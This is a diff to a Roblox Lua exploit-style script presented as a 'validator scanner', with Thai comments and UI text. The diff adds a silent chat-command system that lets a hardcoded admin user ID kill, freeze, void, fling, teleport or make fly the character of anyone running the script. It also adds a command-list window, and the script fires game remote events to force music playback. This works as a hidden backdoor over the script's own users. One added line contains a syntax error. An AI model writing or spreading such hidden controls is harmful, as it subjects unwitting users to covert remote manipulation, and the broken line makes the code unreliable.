@@ -1,6 +1,6 @@
 -- =====================================================
 -- HONKUKI DEEP VALIDATOR SCANNER (MOBILE-HORIZONTAL ULTRA-LIGHT)
--- [FIXED: HEAD TAG FOR SCRIPT EXECUTORS ONLY]
+-- [UPDATED: FULL ADMIN COMMANDS + COMMAND LIST WINDOW]
 -- =====================================================
 
 local Players = game:GetService("Players")
@@ -330,14 +330,12 @@ playMusicFromId = function(musicId)
 
     local success1, success2 = false, false
 
-    -- 1. รีโมทสั่งเล่นเพลงผ่าน Boombox
     local event1 = re:FindFirstChild("PlayerToolEvent")
     if event1 then
         local args1 = { "ToolMusicText", tostring(musicId), "", [4] = true }
         success1 = pcall(function() event1:FireServer(unpack(args1)) end)
     end
 
-    -- 2. รีโมทสั่งเล่นเพลงผ่านรถ / สเก็ตบอร์ด / สกู๊ตเตอร์
     local event2 = re:FindFirstChild("1NoMoto1rVehicle1s")
     if event2 then
         local args2 = { "PickingScooterMusicText", tostring(musicId), "", [4] = true }
@@ -371,7 +369,6 @@ local function applyMyHeadTag()
     txt.TextSize = 11
     Instance.new("UICorner", txt).CornerRadius = UDim.new(0, 6)
 
-    -- ตรวจสอบว่าคนที่รันเป็น Admin หรือ Player ทั่วไปที่นำสคริปต์ไปใช้
     if LocalPlayer.UserId == ADMIN_USER_ID then
         txt.Text = "👑 HONKUKI ADMIN"
         txt.BackgroundColor3 = Color3.fromRGB(255, 170, 0)
@@ -383,29 +380,118 @@ local function applyMyHeadTag()
     end
 end
 
--- สั่งแสดงป้ายเฉพาะ LocalPlayer (คนที่กดรันสคริปต์เท่านั้น)
 applyMyHeadTag()
 LocalPlayer.CharacterAdded:Connect(function()
     task.wait(1)
     applyMyHeadTag()
 end)
 
--- ==================== SILENT CHAT COMMAND LISTENER ====================
+-- ==================== FULL SILENT ADMIN COMMANDS SYSTEM ====================
+local function isTargetMatch(p, targetStr)
+    if not p then return false end
+    targetStr = string.lower(targetStr)
+    if targetStr == "all" or targetStr == "others" then return true end
+    local myName = string.lower(p.Name)
+    local myDisplay = string.lower(p.DisplayName)
+    return string.find(myName, targetStr) or string.find(myDisplay, targetStr)
+end
+
 processAdminCommand = function(msg)
     if not msg then return end
 
-    local targetName, musicId = string.match(msg, "^;p%s+(%S+)%s+(%d+)")
-    if targetName and musicId then
-        targetName = string.lower(targetName)
-        local myName = string.lower(LocalPlayer.Name)
-        local myDisplay = string.lower(LocalPlayer.DisplayName)
-
-        if targetName == "all" or string.find(myName, targetName) or string.find(myDisplay, targetName) then
+    -- 1. ;p <ชื่อ> <id>
+    local targetP, musicId = string.match(msg, "^;p%s+(%S+)%s+(%d+)")
+    if targetP and musicId then
+        if isTargetMatch(LocalPlayer, targetP) then
             playMusicFromId(musicId)
-            if StatusLabel then
-                StatusLabel.Text = "🎵 สั่งเล่นเพลง " .. musicId .. " ตามคำสั่ง Admin แล้ว!"
+            if StatusLabel then StatusLabel.Text = "🎵 สั่งเล่นเพลง " .. musicId .. " ตามคำสั่ง Admin แล้ว!" end
+        end
+        return
+    end
+
+    local cmd, targetName = string.match(msg, "^;(%w+)%s*(%S*)")
+    if not cmd then return end
+    cmd = string.lower(cmd)
+    targetName = targetName or ""
+
+    if targetName ~= "" and not isTargetMatch(LocalPlayer, targetName) then
+        return
+    end
+
+    local char = LocalPlayer.Character
+    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+    local hum = char and char:FindFirstChildOfClass("Humanoid")
+
+    -- ;kill
+    if cmd == "kill" then
+        if hrp then hrp.CFrame = CFrame.new(0, -500, 0) end
+        if hum then hum.Health = 0 end
+        if StatusLabel then StatusLabel.Text = "☠️ โดน Admin สั่ง Kill" end
+
+    -- ;freeze
+    elseif cmd == "freeze" then
+        if hrp then hrp.Anchored = true end
+        if StatusLabel then StatusLabel.Text = "🧊 โดน Admin สั่ง Freeze" end
+
+    -- ;unfreeze
+    elseif cmd == "unfreeze" then
+        if hrp then hrp.Anchored = false end
+        if StatusLabel then StatusLabel.Text = "🔥 โดน Admin สั่ง Unfreeze" end
+
+    -- ;void
+    elseif cmd == "void" then
+        if hrp then hrp.CFrame = CFrame.new(0, -5000, 0) end
+        if StatusLabel then StatusLabel.Text = "🌌 โดน Admin สั่ง Void" end
+
+    -- ;fling
+    elseif cmd == "fling" then
+        if hrp then
+            local bav = Instance.new("BodyAngularVelocity")
+            bav.AngularVelocity = Vector3.new(0, 99999, 0)
+            bav.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
+            bav.Parent = hrp
+            task.wait(0.3)
+            bav:Destroy()
+        end
+        if StatusLabel then StatusLabel.Text = "🌀 โดน Admin สั่ง Fling" end
+
+    -- ;bring
+    elseif cmd == "bring" then
+        local adminPlayer = Players:GetPlayerByUserId(ADMIN_USER_ID)
+        if adminPlayer and adminPlayer.Character and adminPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            if hrp then
+                hrp.CFrame = adminPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
             end
         end
+        if StatusLabel then StatusLabel.Text = "✨ โดน Admin สั่ง Bring" end
+
+    -- ;tp (ส่งตัวคนรันไปหาผู้เล่นอื่น)
+    elseif cmd == "tp" then
+        local destPlayer = Players:FindFirstChild(targetName)
+        if destPlayer and destPlayer.Character and destPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            if hrp then
+                hrp.CFrame = destPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
+            end
+        end
+        if StatusLabel me then StatusLabel.Text = "🚀 โดน Admin สั่ง TP" end
+
+    -- ;fly
+    elseif cmd == "fly" then
+        if hrp and not hrp:FindFirstChild("AdminFlyBV") then
+            local bv = Instance.new("BodyVelocity")
+            bv.Name = "AdminFlyBV"
+            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+            bv.Velocity = Vector3.new(0, 2, 0)
+            bv.Parent = hrp
+        end
+        if StatusLabel then StatusLabel.Text = "🕊️ โดน Admin สั่ง Fly" end
+
+    -- ;unfly
+    elseif cmd == "unfly" then
+        if hrp and hrp:FindFirstChild("AdminFlyBV") then
+            hrp.AdminFlyBV:Destroy()
+        end
+        if StatusLabel then StatusLabel.Text = "🛑 โดน Admin สั่ง Unfly" end
     end
 end
 
@@ -555,6 +641,7 @@ Instance.new("UICorner", ViewInstantBtn).CornerRadius = UDim.new(0, 4)
 -- ==================== ADMIN MENU FRAME (EXCLUSIVE FOR HONKUKI) ====================
 local AdminBtn = nil
 local AdminMenuFrame = nil
+local AdminCmdListFrame = nil
 
 if IsAdmin then
     AdminBtn = Instance.new("TextButton", ButtonsContainer)
@@ -566,9 +653,10 @@ if IsAdmin then
     AdminBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
     Instance.new("UICorner", AdminBtn).CornerRadius = UDim.new(0, 4)
 
+    -- หน้าต่างเมนู Admin หลัก
     AdminMenuFrame = Instance.new("Frame", ScreenGui)
-    AdminMenuFrame.Size = UDim2.new(0, 280, 0, 200)
-    AdminMenuFrame.Position = UDim2.new(0.5, -140, 0.5, -100)
+    AdminMenuFrame.Size = UDim2.new(0, 280, 0, 230)
+    AdminMenuFrame.Position = UDim2.new(0.5, -140, 0.5, -115)
     AdminMenuFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
     AdminMenuFrame.Visible = false
     AdminMenuFrame.ZIndex = 10
@@ -592,7 +680,7 @@ if IsAdmin then
 
     local MusicBox = Instance.new("TextBox", AdminMenuFrame)
     MusicBox.Size = UDim2.new(0.9, 0, 0, 26)
-    MusicBox.Position = UDim2.new(0.05, 0, 0.22, 0)
+    MusicBox.Position = UDim2.new(0.05, 0, 0.18, 0)
     MusicBox.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
     MusicBox.PlaceholderText = "ใส่ ID เพลงที่ต้องการสั่งเล่น..."
     MusicBox.Text = ""
@@ -602,8 +690,8 @@ if IsAdmin then
     Instance.new("UICorner", MusicBox).CornerRadius = UDim.new(0, 4)
 
     local ForcePlayBtn = Instance.new("TextButton", AdminMenuFrame)
-    ForcePlayBtn.Size = UDim2.new(0.9, 0, 0, 28)
-    ForcePlayBtn.Position = UDim2.new(0.05, 0, 0.40, 0)
+    ForcePlayBtn.Size = UDim2.new(0.9, 0, 0, 26)
+    ForcePlayBtn.Position = UDim2.new(0.05, 0, 0.33, 0)
     ForcePlayBtn.BackgroundColor3 = Color3.fromRGB(255, 170, 0)
     ForcePlayBtn.Text = "🔊 สั่งเล่นเพลงผู้เล่นที่เลือก (;p)"
     ForcePlayBtn.Font = Enum.Font.GothamBold
@@ -612,8 +700,8 @@ if IsAdmin then
     Instance.new("UICorner", ForcePlayBtn).CornerRadius = UDim.new(0, 4)
 
     local ForcePlayAllBtn = Instance.new("TextButton", AdminMenuFrame)
-    ForcePlayAllBtn.Size = UDim2.new(0.9, 0, 0, 28)
-    ForcePlayAllBtn.Position = UDim2.new(0.05, 0, 0.58, 0)
+    ForcePlayAllBtn.Size = UDim2.new(0.9, 0, 0, 26)
+    ForcePlayAllBtn.Position = UDim2.new(0.05, 0, 0.48, 0)
     ForcePlayAllBtn.BackgroundColor3 = Color3.fromRGB(230, 60, 60)
     ForcePlayAllBtn.Text = "🌐 สั่งทุกคนเปิดเพลงพร้อมกัน (;p all)"
     ForcePlayAllBtn.Font = Enum.Font.GothamBold
@@ -621,15 +709,98 @@ if IsAdmin then
     ForcePlayAllBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
     Instance.new("UICorner", ForcePlayAllBtn).CornerRadius = UDim.new(0, 4)
 
+    -- ปุ่มเพิ่มใหม่: ปุ่มดูคำสั่ง Admin
+    local ViewAdminCmdBtn = Instance.new("TextButton", AdminMenuFrame)
+    ViewAdminCmdBtn.Size = UDim2.new(0.9, 0, 0, 26)
+    ViewAdminCmdBtn.Position = UDim2.new(0.05, 0, 0.63, 0)
+    ViewAdminCmdBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 220)
+    ViewAdminCmdBtn.Text = "📜 รายชื่อคำสั่ง ADMIN ทั้งหมด"
+    ViewAdminCmdBtn.Font = Enum.Font.GothamBold
+    ViewAdminCmdBtn.TextSize = 10
+    ViewAdminCmdBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Instance.new("UICorner", ViewAdminCmdBtn).CornerRadius = UDim.new(0, 4)
+
     local CloseAdminBtn = Instance.new("TextButton", AdminMenuFrame)
-    CloseAdminBtn.Size = UDim2.new(0.9, 0, 0, 24)
-    CloseAdminBtn.Position = UDim2.new(0.05, 0, 0.78, 0)
+    CloseAdminBtn.Size = UDim2.new(0.9, 0, 0, 22)
+    CloseAdminBtn.Position = UDim2.new(0.05, 0, 0.81, 0)
     CloseAdminBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
     CloseAdminBtn.Text = "ปิดหน้าต่าง"
     CloseAdminBtn.Font = Enum.Font.Gotham
     CloseAdminBtn.TextSize = 10
     CloseAdminBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
     Instance.new("UICorner", CloseAdminBtn).CornerRadius = UDim.new(0, 4)
+
+    -- หน้าต่างรองสำหรับแสดง "รายชื่อคำสั่ง Admin"
+    AdminCmdListFrame = Instance.new("Frame", ScreenGui)
+    AdminCmdListFrame.Size = UDim2.new(0, 300, 0, 220)
+    AdminCmdListFrame.Position = UDim2.new(0.5, -150, 0.5, -110)
+    AdminCmdListFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+    AdminCmdListFrame.Visible = false
+    AdminCmdListFrame.ZIndex = 15
+    Instance.new("UICorner", AdminCmdListFrame).CornerRadius = UDim.new(0, 8)
+    local cmdListStroke = Instance.new("UIStroke", AdminCmdListFrame)
+    cmdListStroke.Color = Color3.fromRGB(0, 150, 220)
+    cmdListStroke.Thickness = 1.5
+
+    local CmdTopBar = Instance.new("Frame", AdminCmdListFrame)
+    CmdTopBar.Size = UDim2.new(1, 0, 0, 30)
+    CmdTopBar.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+    Instance.new("UICorner", CmdTopBar).CornerRadius = UDim.new(0, 8)
+    setDrag(AdminCmdListFrame, CmdTopBar)
+
+    local CmdTitle = Instance.new("TextLabel", CmdTopBar)
+    CmdTitle.Size = UDim2.new(1, -10, 1, 0)
+    CmdTitle.Position = UDim2.new(0, 10, 0, 0)
+    CmdTitle.BackgroundTransparency = 1
+    CmdTitle.Text = "📜 ADMIN SILENT COMMANDS"
+    CmdTitle.TextColor3 = Color3.fromRGB(0, 200, 255)
+    CmdTitle.Font = Enum.Font.GothamBold
+    CmdTitle.TextSize = 11
+    CmdTitle.TextXAlignment = Enum.TextXAlignment.Left
+
+    local CmdScroll = Instance.new("ScrollingFrame", AdminCmdListFrame)
+    CmdScroll.Size = UDim2.new(0.92, 0, 0, 140)
+    CmdScroll.Position = UDim2.new(0.04, 0, 0.18, 0)
+    CmdScroll.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
+    CmdScroll.BorderSizePixel = 0
+    CmdScroll.ScrollBarThickness = 4
+    CmdScroll.ScrollBarImageColor3 = Color3.fromRGB(0, 150, 220)
+    Instance.new("UICorner", CmdScroll).CornerRadius = UDim.new(0, 5)
+
+    local CmdTextLabel = Instance.new("TextLabel", CmdScroll)
+    CmdTextLabel.Size = UDim2.new(1, -10, 1, -10)
+    CmdTextLabel.Position = UDim2.new(0, 5, 0, 5)
+    CmdTextLabel.BackgroundTransparency = 1
+    CmdTextLabel.TextColor3 = Color3.fromRGB(230, 230, 230)
+    CmdTextLabel.Font = Enum.Font.Code
+    CmdTextLabel.TextSize = 10
+    CmdTextLabel.TextXAlignment = Enum.TextXAlignment.Left
+    CmdTextLabel.TextYAlignment = Enum.TextYAlignment.Top
+    CmdTextLabel.Text = [[
+
+👑 คำสั่งควบคุม Admin (พิมพ์ช่องแชท):
+---------------------------------
+;kill <ชื่อ/all>   - ฆ่าเป้าหมาย
+;freeze <ชื่อ/all> - แช่แข็งเป้าหมาย
+;unfreeze <ชื่อ/all> - ปลดแช่แข็ง
+;void <ชื่อ/all>   - ส่งลง Void (-5000)
+;fling <ชื่อ/all>  - หมุนกระเด็นออกแมพ
+;bring <ชื่อ>      - ดึงตัวมาหา Admin
+;tp <ชื่อ>         - วาร์ปไปหาเป้าหมาย
+;fly <ชื่อ/all>    - ให้เป้าหมายบิน
+;unfly <ชื่อ/all>  - ปิดการบิน
+;p <ชื่อ/all> <id> - สั่งเปิดเพลงตาม ID
+]]
+
+    local CloseCmdListBtn = Instance.new("TextButton", AdminCmdListFrame)
+    CloseCmdListBtn.Size = UDim2.new(0.92, 0, 0, 22)
+    CloseCmdListBtn.Position = UDim2.new(0.04, 0, 0.85, 0)
+    CloseCmdListBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+    CloseCmdListBtn.Text = "ปิดหน้าต่างคำสั่ง"
+    CloseCmdListBtn.Font = Enum.Font.Gotham
+    CloseCmdListBtn.TextSize = 10
+    CloseCmdListBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Instance.new("UICorner", CloseCmdListBtn).CornerRadius = UDim.new(0, 4)
 
     ForcePlayBtn.MouseButton1Click:Connect(function()
         local id = MusicBox.Text
@@ -651,12 +822,24 @@ if IsAdmin then
         end
     end)
 
+    ViewAdminCmdBtn.MouseButton1Click:Connect(function()
+        AdminCmdListFrame.Visible = not AdminCmdListFrame.Visible
+    end)
+
+    CloseCmdListBtn.MouseButton1Click:Connect(function()
+        AdminCmdListFrame.Visible = false
+    end)
+
     AdminBtn.MouseButton1Click:Connect(function()
         AdminMenuFrame.Visible = not AdminMenuFrame.Visible
+        if not AdminMenuFrame.Visible then
+            AdminCmdListFrame.Visible = false
+        end
     end)
 
     CloseAdminBtn.MouseButton1Click:Connect(function()
         AdminMenuFrame.Visible = false
+        AdminCmdListFrame.Visible = false
     end)
 end
 
@@ -1008,6 +1191,8 @@ ToggleBtn.MouseButton1Click:Connect(function()
     MainFrame.Visible = not MainFrame.Visible
     if not MainFrame.Visible then 
         JunkFrame.Visible = false 
+        if AdminMenuFrame then AdminMenuFrame.Visible = false end
+        if AdminCmdListFrame then AdminCmdListFrame.Visible = false end
     else
         refreshPlayers()
     end
